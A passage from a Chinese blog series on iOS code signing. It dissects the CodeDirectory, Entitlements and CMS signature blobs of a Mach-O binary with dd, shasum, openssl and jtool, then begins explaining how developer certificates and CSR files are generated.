</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">count</span><span class="p">;</span>   <span class="cm">/* 5 */</span>
</span><span class='line'>    <span class="n">CS_BlobIndex</span> <span class="n">index</span><span class="p">[];</span>  <span class="cm">/* 蓝色部分 */</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="c1">// 蓝色部分②  5个BlobIndex</span>
</span><span class='line'><span class="k">struct</span> <span class="n">__BlobIndex</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">type</span><span class="p">;</span>    <span class="cm">/* 0x0 -&gt; Code Directory */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">offset</span><span class="p">;</span>  <span class="cm">/* 0x34 -&gt; 0xD300 + 0x34 = 0xD334 指向绿色③*/</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">struct</span> <span class="n">__BlobIndex</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">type</span><span class="p">;</span>    <span class="cm">/* 0x2 -&gt; Requirements */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">offset</span><span class="p">;</span>  <span class="cm">/* 0x221 -&gt; 0xD300 + 0x221 = 0xD521 */</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">struct</span> <span class="n">__BlobIndex</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">type</span><span class="p">;</span>    <span class="cm">/* 0x5 -&gt; Entitlements */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">offset</span><span class="p">;</span>  <span class="cm">/* 0x2CD -&gt; 0xD300 + 0x2CD = 0xD5CD */</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">struct</span> <span class="n">__BlobIndex</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">type</span><span class="p">;</span>    <span class="cm">/* 0x1000 -&gt; Code Directory */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">offset</span><span class="p">;</span>  <span class="cm">/* 0x475 -&gt; 0xD300 + 0x475 = 0xD775 */</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">struct</span> <span class="n">__BlobIndex</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">type</span><span class="p">;</span>    <span class="cm">/* 0x10000 -&gt; CMS Signature */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">offset</span><span class="p">;</span>  <span class="cm">/* 0x746 -&gt; 0xD300 + 0x746 = 0xDA46 */</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>这部分是典型的数据头结构，声明了5个Blob，以及每个Blob的类型和相对签名头部的偏移量。接下来把每个部分分别提取出来进行分析。</p>

<h4>CodeDirectory</h4>

<p>CodeDirectory是签名数据中最终要的部分，直译过来就是代码目录，其实里面是整个MachO文件的哈希值，这里的哈希并不是一次性对整个文件进行哈希，而是将MachO文件按照pageSize(一般是4k也就是4096字节)进行分页，每一页单独计算哈希，并按照顺序保存下来，就像目录一样。</p>

<p>细心的同学会发现上面的数据中出现了两个CodeDirectory，type分别是<code>0x0</code>和<code>0x1000</code>，这也是历史遗留问题，<code>0x0</code>对应的是旧版本的代码签名，使用sha1算法进行哈希值的计算，而<code>0x1000</code>是后来引入的，采用sha256作为哈希算法，除了算法和哈希的长度不同之外，其他内容基本是一样的。取第一个进行分析：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// 绿色部分③ Offset: 0xD334</span>
</span><span class='line'><span class="k">struct</span> <span class="n">__CodeDirectory</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">magic</span><span class="p">;</span>         <span class="cm">/* 0xFADE0C02 -&gt; CSMAGIC_CODEDIRECTORY */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">length</span><span class="p">;</span>        <span class="cm">/* 0x1ED -&gt; 493 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">version</span><span class="p">;</span>       <span class="cm">/* 0x00020400 -&gt; v2.4.0 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">flags</span><span class="p">;</span>         <span class="cm">/* 0 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">hashOffset</span><span class="p">;</span>    <span class="cm">/* 0xD5 -&gt; 0xD334 + 0xD5 = 0xD409 指向⑤*/</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">identOffset</span><span class="p">;</span>   <span class="cm">/* 0x58 -&gt; 0xD334 + 0x58 = 0xD38B 指向④*/</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">nSpecialSlots</span><span class="p">;</span> <span class="cm">/* 5 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">nCodeSlots</span><span class="p">;</span>    <span class="cm">/* 0xE -&gt; 14 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">codeLimit</span><span class="p">;</span>     <span class="cm">/* 0xD300 */</span>
</span><span class='line'>    <span class="kt">uint8_t</span> <span class="n">hashSize</span><span class="p">;</span>       <span class="cm">/* 0x14 -&gt; 20bytes -&gt; 160bits (sha1) */</span>
</span><span class='line'>    <span class="kt">uint8_t</span> <span class="n">hashType</span><span class="p">;</span>       <span class="cm">/* 0x01 (sha1) */</span>
</span><span class='line'>    <span class="kt">uint8_t</span> <span class="n">spare1</span><span class="p">;</span>         <span class="cm">/* unused (must be zero) */</span>
</span><span class='line'>    <span class="kt">uint8_t</span> <span class="n">pageSize</span><span class="p">;</span>       <span class="cm">/* 0x0C -&gt; 2 ^ 0x0C = 0x1000 = 4096 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">spare2</span><span class="p">;</span>        <span class="cm">/* unused (must be zero) */</span>
</span><span class='line'>    <span class="cm">/* followed by dynamic content as located by offset fields above */</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>hashOffset就是&#8221;目录&#8221;第一页的偏移，从这个位置(0xD409)可以提取到一串20字节的sha1值(图中黄色⑤):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mi">9</span><span class="n">D452342F9ED06189E4F099BCA7CB68D6432F775</span>
</span></code></pre></td></tr></table></div></figure>


<p>这个值代表的就是该文件第一页的哈希值，通过以下命令计算文件前4096字节的sha1可进行验证</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>dd <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>0 <span class="nv">count</span><span class="o">=</span>0x1000 <span class="k">if</span><span class="o">=</span>TestCodeSign 2&gt;/dev/null <span class="p">|</span> shasum -a 1
</span><span class='line'>9d452342f9ed06189e4f099bca7cb68d6432f775  -
</span></code></pre></td></tr></table></div></figure>


<p>而紧接着的20个字节就是第二页的哈希值，以此类推，直到原始文件的最后一页。</p>

<p>由于文件不一定是pageSize的整数倍，最后一页往往不足&#8221;一整页&#8221;的大小，因此需要额外的字段<code>codeLimit</code>记录文件的实际大小，也就是需要签名的数据的实际大小，通过这个值计算出最后一页的实际大小，并提取相应数据计算最后一页的签名。例子中<code>codeLimit=0xD300</code>，很容易得出最后一页大小为<code>0x300</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>dd <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>0xD000 <span class="nv">count</span><span class="o">=</span>0x300 <span class="k">if</span><span class="o">=</span>TestCodeSign 2&gt;/dev/null <span class="p">|</span> shasum -a 1
</span><span class='line'>9dc960fc86f803c1fa100f2a1145cf7cbe58e803  -
</span></code></pre></td></tr></table></div></figure>


<p>计算出最后一页的sha1值与CodeDirectory中(图中黄色⑥)一致。</p>

<p>nCodeSlots记录了文件的总页数14，可通过<code>0xD300 / 0x1000 = 13.1875</code>得出确实是14页。</p>

<p>细心的朋友已经发现了，④ identifier和 ⑤ hashSlots 之间有一段多出的数据⑦，并且CodeDirectory中还有一个奇怪的值<code>nSpecialSlots=5</code>，整个文件的哈希值都已经包含在⑤和⑥之间了，这多出来的数据是怎么回事呢？</p>

<p>原来，在第一页的前面，还有5个特殊的负数页，用来保存这些额外信息的哈希值。</p>

<table>
<thead>
<tr>
<th></th>
<th> 序号 </th>
<th> 对应内容                                              </th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td> -1   </td>
<td> App根目录的Info.plist文件                            </td>
</tr>
<tr>
<td></td>
<td> -2   </td>
<td> Requirements(代码签名的第二部分)                      </td>
</tr>
<tr>
<td></td>
<td> -3   </td>
<td> Resource Directory (_CodeSignature/CodeResources文件) </td>
</tr>
<tr>
<td></td>
<td> -4   </td>
<td> 暂未使用                                              </td>
</tr>
<tr>
<td></td>
<td> -5   </td>
<td> Entitlements (代码签名的第三部分)                     </td>
</tr>
</tbody>
</table>


<p>同样地，出于性能考虑，这些哈希值并未经过任何加密，只需要确保这些哈希值未经篡改，就可以说明代码本身没有被篡改。</p>

<h4>Requirements</h4>

<p>用于指定签名校验时的一些额外的约束，签名时codesign命令会自动生成这部分数据，但目前并没有看到什么地方使用了它，就不深入分析了，官方文档有对这部分内容的详细描述</p>

<ul>
<li><a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Introduction/Introduction.html">Code Signing Tasks</a></li>
<li><a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/RequirementLang/RequirementLang.html#//apple_ref/doc/uid/TP40005929-CH5-SW1">Code Signing Requirement Language</a></li>
</ul>


<h4>Entitlements</h4>

<p><img src="http://xelz.info/assets/2019/codesign3.png" alt="" /></p>

<p>通过头部的偏移定位到数据的位置，显然，这是一个Blob结构</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">__Blob</span> <span class="p">{</span>       <span class="cm">/* Address: 0xD5CD */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">magic</span><span class="p">;</span>   <span class="cm">/* 0xFADE7171 -&gt; CSMAGIC_ENTITLEMENT */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">length</span><span class="p">;</span>  <span class="cm">/* 0x1A8 -&gt; 424 */</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>之前由Xcode生成的Entitlements文件被整个嵌入到签名数据中。</p>

<h4>CMS Signature</h4>

<p>CMS是<code>Cryptographic Message Syntax</code>的缩写，是一种标准的签名格式，由<a href="https://www.ietf.org/rfc/rfc3852.txt">RFC3852</a>定义。还记得Provisioning Profile的签名吗？它们是相同的格式。CMS格式的签名中，除了包含前面我们推导出的加密哈希和证书之外，还承载了一些其他的信息。由于是二进制格式，不方便分析，可以将其内容从MachO文件中剥离出来，再找合适的工具进行解析。根据偏移量定位到CMS Signature的位置<code>0xDA46</code></p>

<p><img src="http://xelz.info/assets/2019/codesign4.png" alt="" /></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">__Blob</span> <span class="p">{</span>       <span class="cm">/* Address: 0xDA46 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">magic</span><span class="p">;</span>   <span class="cm">/* 0xFADE0B01 -&gt; CSMAGIC_BLOBWRAPPER */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">length</span><span class="p">;</span>  <span class="cm">/* 0x12D8 -&gt; 4824 */</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>除去头部的8个字节，把对应的内容提取出来</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>dd <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>0xDA4E <span class="nv">count</span><span class="o">=</span>0x12D0 <span class="k">if</span><span class="o">=</span>TestCodeSign <span class="nv">of</span><span class="o">=</span>cms_signature
</span></code></pre></td></tr></table></div></figure>


<p>可以将导出的cms_signature文件上传到<a href="http://lapo.it/asn1js/">在线ASN.1解析工具</a>(支持CMS格式解析)进行分析</p>

<p><img src="http://xelz.info/assets/2019/codesign5.png" alt="" /></p>

<p>文件被解析为树状结构，看起来还是不够直观，因为这个工具只是按照数据格式把内容进行了格式化，但是并没有标注所有字段的确切含义。其实我们还可以使用openssl进行查看，但是因为Mac上自带的openssl以及通过HomeBrew安装的openssl都是没有开启cms支持的，所以可以将文件拷贝到linux机器上或者自行编译openssl进行查看，具体方法在此不表。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>openssl cms -cmsout -print -inform DER -in cms_signature
</span><span class='line'>CMS_ContentInfo:
</span><span class='line'>  contentType: pkcs7-signedData <span class="o">(</span>1.2.840.113549.1.7.2<span class="o">)</span>
</span><span class='line'>  d.signedData:
</span><span class='line'>    version: 1
</span><span class='line'>    digestAlgorithms:
</span><span class='line'>        algorithm: sha256 <span class="o">(</span>2.16.840.1.101.3.4.2.1<span class="o">)</span>
</span><span class='line'>        parameter: NULL
</span><span class='line'>    encapContentInfo:
</span><span class='line'>      eContentType: pkcs7-data <span class="o">(</span>1.2.840.113549.1.7.1<span class="o">)</span>
</span><span class='line'>      eContent: &lt;ABSENT&gt;
</span><span class='line'>    certificates:
</span><span class='line'>      ... <span class="o">[</span>stripped<span class="o">]</span> Apple Worldwide Developer Relations Certification Authority
</span><span class='line'>      ... <span class="o">[</span>stripped<span class="o">]</span> Apple Root CA
</span><span class='line'>      ... <span class="o">[</span>stripped<span class="o">]</span> iPhone Developer: xxxxxxx
</span><span class='line'>    signerInfos:
</span><span class='line'>        version: 1
</span><span class='line'>        d.issuerAndSerialNumber:
</span><span class='line'>          issuer: <span class="nv">C</span><span class="o">=</span>US, <span class="nv">O</span><span class="o">=</span>Apple Inc., <span class="nv">OU</span><span class="o">=</span>Apple Worldwide Developer Relations, <span class="nv">CN</span><span class="o">=</span>Apple Worldwide Developer Relations Certification Authority
</span><span class='line'>          serialNumber: 1008862887770590428
</span><span class='line'>        digestAlgorithm:
</span><span class='line'>          algorithm: sha256 <span class="o">(</span>2.16.840.1.101.3.4.2.1<span class="o">)</span>
</span><span class='line'>          parameter: NULL
</span><span class='line'>        signedAttrs:
</span><span class='line'>            ... <span class="o">[</span>stripped<span class="o">]</span>
</span><span class='line'>              SEQUENCE:
</span><span class='line'>    0:d<span class="o">=</span>0  <span class="nv">hl</span><span class="o">=</span>2 <span class="nv">l</span><span class="o">=</span>  29 cons: SEQUENCE
</span><span class='line'>    2:d<span class="o">=</span>1  <span class="nv">hl</span><span class="o">=</span>2 <span class="nv">l</span><span class="o">=</span>   5 prim:  OBJECT            :sha1
</span><span class='line'>    9:d<span class="o">=</span>1  <span class="nv">hl</span><span class="o">=</span>2 <span class="nv">l</span><span class="o">=</span>  20 prim:  OCTET STRING      <span class="o">[</span>HEX DUMP<span class="o">]</span>:669421362B2F2B5303BCEBB47D793A75A6BBD32F
</span><span class='line'>
</span><span class='line'>            ... <span class="o">[</span>stripped<span class="o">]</span>
</span><span class='line'>        signatureAlgorithm:
</span><span class='line'>          algorithm: rsaEncryption <span class="o">(</span>1.2.840.113549.1.1.1<span class="o">)</span>
</span><span class='line'>          parameter: NULL
</span><span class='line'>        signature:
</span><span class='line'>          0000 - 77 00 50 9c 5c 6d 50 1e-cb 4b ca b7 91 d3 5b   w.P.<span class="se">\m</span>P..K....<span class="o">[</span>
</span><span class='line'>          000f - 2e 28 fe f3 5d 20 73 ef-0a 59 ac 2e ed bd 2a   .<span class="o">(</span>..<span class="o">]</span> s..Y....*
</span><span class='line'>          ... <span class="o">[</span>stripped<span class="o">]</span>
</span><span class='line'>        unsignedAttrs:
</span><span class='line'>          &lt;EMPTY&gt;
</span></code></pre></td></tr></table></div></figure>


<p>由于输出内容太多，将部分内容做了删减，可以观察到签名中主要包含了这些内容</p>

<ul>
<li><strong>contentType</strong>， 表明消息的类型，有6种取值，这里使用的是表示签名的signedData类型

<ul>
<li>Data</li>
<li>SignedData</li>
<li>EnvelopedData</li>
<li>DigestedData</li>
<li>EncryptedData</li>
<li>AuthenticatedData</li>
</ul>
</li>
<li><strong>content</strong>，SignedData类型的数据

<ul>
<li>version等：略</li>
<li>certificates： 证书链，包含用于签名的开发者证书及所有上游CA的证书</li>
<li>signerInfos：真正的签名信息！

<ul>
<li>version：版本号</li>
<li>issuerAndSerialNumber：签名者信息，根据签名者的名称找到证书链中对应的证书，使用证书中的公钥即可验证签名是否有效</li>
<li>digestAlgorithm：哈希算法</li>
<li>signedAttrs：需要签名的属性, 是可选项，为空表示被签名的数据是原始文件的内容，如果不为空则至少要包含原始文件的类型以及其哈希值，此时被签名的数据就是signedAttrs的内容</li>
<li>signatureAlgorithm：签名算法，这里指对哈希值进行加密所使用的算法</li>
<li>signature：加密后的哈希值</li>
</ul>
</li>
</ul>
</li>
</ul>


<p>由于在Code Directory中已经保存了所有资源及代码的哈希值，那么我们只需要确保CodeDirectory不被篡改，即可确保整个app的完整性， 因此CMS Signature中只需要对CodeDirectory进行签名即可。而signedAttrs中支持这样一种特性：可以先计算被签名数据的哈希，然后再对哈希值进行签名。听起来有点绕，不过仔细体会一下应该不难理解。</p>

<p>我们把CodeDirectory的内容抠出来，计算其哈希值，以第一个CodeDirectory为例，计算其sha1：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>dd <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>0xD334 <span class="nv">count</span><span class="o">=</span>0x1ED <span class="k">if</span><span class="o">=</span>TestCodeSign 2&gt;/dev/null <span class="p">|</span> shasum -a 1
</span><span class='line'>669421362b2f2b5303bcebb47d793a75a6bbd32f  -
</span></code></pre></td></tr></table></div></figure>


<p>这个值叫做CDHash(Code Directory&rsquo;s Hash)，对比前面从cms_signature中解析出的 signedAttrs，会发现这两个值是一样的，也就是说CodeDirectory的哈希值被放在了signerInfos->signedAttrs中，作为最终真正被<code>签名</code>(计算哈希并加密)的内容。</p>

<p>至此，我们已经从头到尾剖析了iOS代码签名的生成方式及数据结构，在这个过程中，至少存在4次计算哈希的行为，并且是环环相扣的</p>

<ol>
<li>_CodeSignature/CodeResources中对每个资源文件计算哈希</li>
<li>Code Directory 中对MachO文件本身的每个分页，以及Info.plist、CodeResources、Entitlements等文件计算哈希</li>
<li>CMS Signature的signedAttrs中对Code Directory计算哈希</li>
<li>对signedAttrs计算哈希并使用开发者的私钥加密</li>
</ol>


<p>只有最后一步的哈希值是被加密的， 前面几步的哈希值是否加密都不影响签名的效果，只要任意内容有变化，均会因某个环节的哈希不匹配而导致签名校验的失败。</p>

<h4>jtool</h4>

<p>相信上面的二进制分析已经让你眼花缭乱了，不过已经有大神做出了<a href="http://www.newosxbook.com/tools/jtool.tar">jtool</a>这个工具，它是一款强大的MachO二进制分析工具，用来替代otool、nm、segedit等命令，也包括codesign的部分功能。通过以下命令可以将代码签名解析为可读的文本格式</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>jtool --sig -vv TestCodeSign
</span><span class='line'>Blob at offset: 54016 <span class="o">(</span>19888 bytes<span class="o">)</span> is an embedded signature of 6686 bytes, and 5 blobs
</span><span class='line'>  Blob 0: Type: 0 @52: Code Directory <span class="o">(</span>493 bytes<span class="o">)</span>
</span><span class='line'>      Version:     20400
</span><span class='line'>      Flags:       none <span class="o">(</span>0x0<span class="o">)</span>
</span><span class='line'>      CodeLimit:   0xd300
</span><span class='line'>      Identifier:  test.CodeSign <span class="o">(</span>0x58<span class="o">)</span>
</span><span class='line'>      Team ID:     xxxxxxxxxx <span class="o">(</span>0x66<span class="o">)</span>
</span><span class='line'>      Executable Segment: Base 0x00000000 Limit: 0x00000000 Flags: 0x00000000
</span><span class='line'>      CDHash:      669421362b2f2b5303bcebb47d793a75a6bbd32f <span class="o">(</span>computed<span class="o">)</span>
</span><span class='line'>      <span class="c"># of Hashes: 14 code + 5 special</span>
</span><span class='line'>      Hashes @213 size: 20 Type: SHA-1
</span><span class='line'>          Entitlements blob:  19a92ca549e53593b384681245de14897df2a9dd <span class="o">(</span>OK<span class="o">)</span>
</span><span class='line'>          Application Specific:   Not Bound
</span><span class='line'>          Resource Directory: fb7df05e17f3b347d6b64868f468def49feecf25 <span class="o">(</span>OK<span class="o">)</span>
</span><span class='line'>          Requirements blob:  9d58965211c9cd83b208fffd575d741881ff81e4 <span class="o">(</span>OK<span class="o">)</span>
</span><span class='line'>          Bound Info.plist:   89e1951413c3eb05fab8f6a5f06c13b48926eabe <span class="o">(</span>OK<span class="o">)</span>
</span><span class='line'>          Slot   0 <span class="o">(</span>File page @0x0000<span class="o">)</span>: 9d452342f9ed06189e4f099bca7cb68d6432f775 <span class="o">(</span>OK<span class="o">)</span>
</span><span class='line'>          ... <span class="o">[</span>stripped<span class="o">]</span>
</span><span class='line'>  ... <span class="o">[</span>stripped<span class="o">]</span>
</span><span class='line'>  Blob 4: Type: 10000 @1862: Blob Wrapper <span class="o">(</span>4824 bytes<span class="o">)</span> <span class="o">(</span>0x10000 is CMS <span class="o">(</span>RFC3852<span class="o">)</span> signature<span class="o">)</span>
</span><span class='line'>CA: Apple Certification Authority CN: Apple Root CA
</span><span class='line'>... <span class="o">[</span>stripped<span class="o">]</span>
</span><span class='line'>Time: 190122095805Z
</span></code></pre></td></tr></table></div></figure>


<h4>Distribute App</h4>

<p>在Xcode Organizer中导出或者提交App时，Xcode会将Entitlements文件及embedded.mobileprovision文件替换为对应的版本，并使用对应的证书重新签名，主要区别如下</p>

<table>
<thead>
<tr>
<th></th>
<th> 类型        </th>
<th> Entitlements             </th>
<th> Provisioning Profile       </th>
<th> 证书           </th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td> AppStore    </td>
<td> 不可调试，推送为生产环境 </td>
<td> 无ProvisionedDevices       </td>
<td> 发布证书       </td>
</tr>
<tr>
<td></td>
<td> Ad Hoc      </td>
<td> 不可调试，推送为生产环境 </td>
<td> 允许安装到已注册的测试设备 </td>
<td> 发布证书       </td>
</tr>
<tr>
<td></td>
<td> Development </td>
<td> 可调试，推送为测试环境   </td>
<td> 允许安装到已注册的测试设备 </td>
<td> 开发证书       </td>
</tr>
<tr>
<td></td>
<td> Enterprise  </td>
<td> 不可调试，推送为生产环境 </td>
<td> ProvisionAllDevices        </td>
<td> 企业级发布证书 </td>
</tr>
</tbody>
</table>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[细说iOS代码签名(二)]]></title>
    <link href="http://xelz.info/blog/2019/01/11/ios-code-signature-2/"/>
    <updated>2019-01-11T11:12:14+08:00</updated>
    <id>http://xelz.info/blog/2019/01/11/ios-code-signature-2</id>
    <content type="html"><![CDATA[<h4>导航</h4>

<ul>
<li>一口气读完，大约需要40-60分钟

<ul>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature/">深度长文：细说iOS代码签名</a></li>
</ul>
</li>
<li>分步阅读

<ul>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-1/">细说iOS代码签名(一)</a>：签名的作用及原理</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-2/">细说iOS代码签名(二)</a>：开发者证书、Entitlements、Provisioning Profile</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-3/">细说iOS代码签名(三)</a>：签名的过程及代码签名的数据结构</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-4/">细说iOS代码签名(四)</a>：签名校验、越狱、重签名</li>
</ul>
</li>
</ul>


<h2>0x03 开发者证书</h2>

<p>在了解了签名和证书的基本结构之后，我们来研究一下iOS的开发者证书，它是开发过程中必不可少的东西，相信大家都有接触。众所周知，iOS设备并不能像Android那样任意地安装app，app必须被Apple签名之后才能安装到设备上。而开发者在开发App的时候需要频繁地修改代码并安装到设备上进行测试，不可能每次都先上传给Apple进行签名，因此需要一种不需要苹果签名就可以运行的机制。</p>

<!-- more -->


<p>这个机制的实现方式是：</p>

<ul>
<li>开发者自己持有一套密钥和证书，可以自行对app进行签名</li>
<li>由Apple对开发者的身份进行“背书”，让设备间能够接信任开发者自行签名的app，这个“背书”的方式就是后面会提到的<code>Provisioning Profile</code></li>
</ul>


<p>那么先研究一下开发者证书是如何产生的：在Xcode 8及之后的版本，Xcode会自动帮我们管理证书，我们可能根本不会有机会去研究它，但是在早期的版本中，需要我们自己动手操作，获取开发者证书主要有两个步骤</p>

<h4>生成CSR文件(Certificate Signing Request)</h4>

<p>在Keychain菜单栏选择&#8221;从证书颁发机构请求证书&hellip;&#8221;</p>

<p><img src="http://xelz.info/assets/2019/csr1.png" alt="csr1" /></p>

<p><img src="http://xelz.info/assets/2019/csr2.png" alt="csr2" /></p>

<p>这个操作会产生一个名为<code>CertificateSigningRequest.certSigningRequest</code> 的签名请求文件，在生成这个文件之前其实Keychain已经自动生成了一对公、私钥</p>

<p><img src="http://xelz.info/assets/2019/csr3.png" alt="csr3" /></p>

<p><img src="http://xelz.info/assets/2019/csr4.png" alt="csr4" /></p>

<p>可以在Keychain中选中这个条目，右键选择导出，将密钥文件导出为p12文件，使用openssl查看其内容</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
